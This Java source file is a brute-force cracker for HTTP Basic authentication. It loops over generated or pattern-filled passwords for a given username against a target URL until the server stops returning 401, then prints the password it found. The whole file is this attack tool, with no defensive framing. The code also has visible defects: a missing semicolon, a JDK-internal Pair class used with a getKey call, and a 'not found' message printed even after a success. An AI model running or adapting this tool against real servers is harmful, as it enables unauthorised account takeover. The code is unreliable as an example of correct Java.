package org.axiom.streamTest;

import jdk.internal.net.http.common.Pair;
import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.auth.AuthScope;
import org.apache.http.auth.UsernamePasswordCredentials;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;


import java.io.IOException;
import java.util.*;
import java.util.function.Supplier

public class Connector {
    private final String alphabet;
    private final String host;
    private final String username;
    private final String fullURL;
    private final int port;

    public Connector(String alphabet, String host, String username, String fullURL, int port) {
        this.alphabet = alphabet;
        this.host = host;
        this.username = username;
        this.fullURL = fullURL;
        this.port = port;
    }


    public void getPass(int maxPassLen, String pattern)  throws IOException {
        Pair<String, Character> pair = preparePattern(pattern);
        pattern = pair.getKey();

        int genLen = (int)pattern.chars().filter(in -> in == pair.getValue()).count();
        //  pattern = pattern.replaceAll("(.)\\1+", "$1");

        Supplier<String> passwordSupplier = new PassGenerator(alphabet, genLen);

        DefaultHttpClient httpClient = new DefaultHttpClient();

        for(String password = insert(pattern, passwordSupplier.get(), pair.getValue()) ; password.length() <= maxPassLen ; password = insert(pattern, passwordSupplier.get(), pair.getValue())) {
            httpClient.getCredentialsProvider().setCredentials(
                    new AuthScope(host, port),
                    new UsernamePasswordCredentials(username, password)
            );

            HttpGet httpGet = new HttpGet(fullURL);
            HttpResponse response = httpClient.execute(httpGet);
            HttpEntity entity = response.getEntity();

            if(response.getStatusLine().getStatusCode() != 401) {
                System.out.println("Password found!");
                System.out.println("Pass: " + password);
                break;
            }

            entity.consumeContent();
        }

        System.out.println("Password not found((");

    }


    private String insert(String where, String what, char ch) {
        StringBuilder result = new StringBuilder();

        for(int i=0 , j=0 ; i<where.length() ; ++i)
            if(where.charAt(i) == ch)
                result.append(what.charAt(j++));
            else
                result.append(where.charAt(i));

         return result.toString();
    }


    private Pair<String, Character> preparePattern(String pattern) {
        char[] temp = alphabet.toCharArray();
        Arrays.sort(temp);

        char max = (char)(temp[temp.length - 1] + (char)1);

        HashSet<Character> allowedSymbols = new HashSet<Character>();
        for(int i=0 ; i<alphabet.length() ; ++i)
            allowedSymbols.add(alphabet.charAt(i));

        char[] result = new char[pattern.length()];

        for(int i=0 ; i<pattern.length() ; ++i)
            if(allowedSymbols.contains(pattern.charAt(i)))
                result[i] = pattern.charAt(i);
            else
                result[i] = max;

        return new Pair<String, Character>(new String(result), max);
    }


    /**
     * @return  password, that is suitable for the given server
     */
    public void getPass(int maxPassLen) throws IOException {
        Supplier<String> passwordSupplier = new PassGenerator(alphabet);

        DefaultHttpClient httpClient = new DefaultHttpClient();

        for(String password = passwordSupplier.get() ; password.length() <= maxPassLen ; password = passwordSupplier.get()) {
            httpClient.getCredentialsProvider().setCredentials(
                    new AuthScope(host, port),
                    new UsernamePasswordCredentials(username, password)
            );

            HttpGet httpGet = new HttpGet(fullURL);
            HttpResponse response = httpClient.execute(httpGet);
            HttpEntity entity = response.getEntity();

            if(response.getStatusLine().getStatusCode() != 401) {
                System.out.println("Password found!");
                System.out.println("Pass: " + password);
                break;
            }

            entity.consumeContent();
        }

        System.out.println("Password not found((");

        // When HttpClient instance is no longer needed,
        // shut down the connection manager to ensure
        // immediate deallocation of all system resources
        httpClient.getConnectionManager().shutdown();
    }

}
